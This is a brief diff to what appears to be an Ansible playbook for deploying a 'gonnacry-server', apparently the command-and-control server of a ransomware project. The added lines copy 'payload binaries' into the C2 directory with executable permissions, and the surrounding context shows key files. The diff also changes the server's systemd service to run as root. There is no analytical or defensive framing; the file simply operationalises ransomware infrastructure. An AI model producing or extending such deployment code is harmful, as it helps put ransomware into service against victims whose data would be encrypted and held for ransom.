@@ -50,6 +50,12 @@
         - private_key.key
         - public_key.key
 
+    - name: Deploy payload binaries
+      copy:
+        src: "{{ gonnacry_server_src }}/binaries/"
+        dest: "{{ c2_dir }}/binaries/"
+        mode: '0755'
+
     - name: Install gonnacry-server systemd service
       copy:
         dest: /etc/systemd/system/gonnacry-server.service
@@ -63,6 +69,7 @@
           ExecStart=/usr/bin/python3 {{ c2_dir }}/server.py
           Restart=on-failure
           RestartSec=5
+          User=root
 
           [Install]
           WantedBy=multi-user.target
